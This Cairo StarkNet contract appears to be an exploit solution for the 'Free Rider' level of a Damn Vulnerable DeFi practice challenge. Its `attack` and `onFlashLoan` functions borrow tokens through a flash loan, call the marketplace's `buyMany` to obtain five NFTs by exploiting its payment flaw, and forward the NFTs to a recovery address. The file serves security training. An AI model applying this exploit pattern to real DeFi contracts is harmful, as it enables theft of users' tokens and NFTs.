// SPDX-License-Identifier: MIT

%lang starknet

from starkware.cairo.common.cairo_builtins import HashBuiltin
from starkware.cairo.common.uint256 import Uint256, uint256_le, assert_uint256_le
from openzeppelin.security.safemath.library import SafeUint256

from openzeppelin.token.erc20.IERC20 import IERC20
from openzeppelin.token.erc721.IERC721 import IERC721
from src.IDamnValuableNFT import IDamnValuableNFT
from src.free_rider.interfaces.IFreeRiderNFTMarketplace import IFreeRiderNFTMarketplace
from src.utils.simple_flash_lender.interfaces.ISimpleFlashLender import ISimpleFlashLender

from openzeppelin.utils.constants.library import IERC721_RECEIVER_ID
from openzeppelin.introspection.erc165.library import ERC165

from starkware.cairo.common.alloc import alloc

from starkware.starknet.common.syscalls import get_contract_address, get_caller_address, get_tx_info

from starkware.cairo.common.bool import TRUE, FALSE
from starkware.cairo.common.math import assert_not_zero

const ONE = 10 ** 18;
//
//   STORAGE
//

@storage_var
func Token_address() -> (res: felt) {
}

@storage_var
func NFT_address() -> (res: felt) {
}

@storage_var
func Marketplace_address() -> (res: felt) {
}

@storage_var
func Pool_address() -> (res: felt) {
}

@storage_var
func Recovery_address() -> (res: felt) {
}

@storage_var
func Owner_address() -> (res: felt) {
}

//
//  CONTRACT
//

@constructor
func constructor{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}(
    token_address: felt,
    nft_address: felt,
    marketplace_address: felt,
    pool_address: felt,
    recovery_address: felt,
) {
    ERC165.register_interface(IERC721_RECEIVER_ID);

    let (caller) = get_caller_address();

    Owner_address.write(caller);

    Token_address.write(token_address);
    NFT_address.write(nft_address);
    Marketplace_address.write(marketplace_address);
    Pool_address.write(pool_address);
    Recovery_address.write(recovery_address);

    return ();
}

@external
func attack{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}() {
    let (owner) = Owner_address.read();
    let (this) = get_contract_address();
    let (pool_address) = Pool_address.read();
    let (token_address) = Token_address.read();

    let (owner_bal) = IERC20.balanceOf(token_address, owner);
    let (success) = IERC20.transferFrom(token_address, owner, this, owner_bal);

    // approve pool to spend DVT
    IERC20.approve(token_address, pool_address, Uint256(44 * ONE, 0));

    // borrow 42 DVT
    ISimpleFlashLender.flashLoan(pool_address, this, token_address, Uint256(42 * ONE, 0));

    // send DVT to owner
    let (this_bal) = IERC20.balanceOf(token_address, this);
    let (success) = IERC20.transfer(token_address, owner, this_bal);

    return ();
}

//
//  SimpleFlashLender callback
//
@external
func onFlashLoan{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}(
    initiator_address: felt, token_address: felt, amount: Uint256, fee: Uint256
) -> (res: felt) {
    alloc_locals;
    local pedersen_ptr: HashBuiltin* = pedersen_ptr;

    let (caller) = get_caller_address();
    let (this) = get_contract_address();
    let (pool_address) = Pool_address.read();
    let (token_address) = Token_address.read();
    let (marketplace_address) = Marketplace_address.read();

    with_attr error_message("flashBorrow : untrust initiator") {
        assert initiator_address = pool_address;
    }

    // approve SimpleFlashLender to spend DVT to pay back
    IERC20.approve(token_address, pool_address, Uint256(43 * ONE, 0));

    // approve Marketplace to spend DVT
    IERC20.approve(token_address, marketplace_address, Uint256(84 * 5 * ONE, 0));

    let (token_ids: Uint256*) = alloc();
    assert [token_ids + 0] = Uint256(1, 0);
    assert [token_ids + 2] = Uint256(2, 0);
    assert [token_ids + 4] = Uint256(3, 0);
    assert [token_ids + 6] = Uint256(4, 0);
    assert [token_ids + 8] = Uint256(5, 0);

    // buyMany
    IFreeRiderNFTMarketplace.buyMany(marketplace_address, 5, token_ids);

    // send DVNFT to recovery
    _sendDVNFTToRecovery(5, token_ids);

    return (res=1);
}

func _sendDVNFTToRecovery{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}(
    token_ids_len: felt, token_ids: Uint256*
) {
    alloc_locals;
    local pedersen_ptr: HashBuiltin* = pedersen_ptr;

    if (token_ids_len == 0) {
        return ();
    }

    let (this) = get_contract_address();
    let (nft_address) = NFT_address.read();
    let (recovery_address) = Recovery_address.read();

    let (data: felt*) = alloc();
    let token_id = token_ids[token_ids_len - 1];
    IERC721.safeTransferFrom(nft_address, this, recovery_address, token_id, 0, data);

    return _sendDVNFTToRecovery(token_ids_len - 1, token_ids);
}

//
//  ERC721Holder
//

@view
func supportsInterface{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}(
    interfaceId: felt
) -> (success: felt) {
    return ERC165.supports_interface(interfaceId);
}

@external
func onERC721Received{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}(
    operator: felt, from_: felt, tokenId: Uint256, data_len: felt, data: felt*
) -> (selector: felt) {
    return (selector=IERC721_RECEIVER_ID);
}
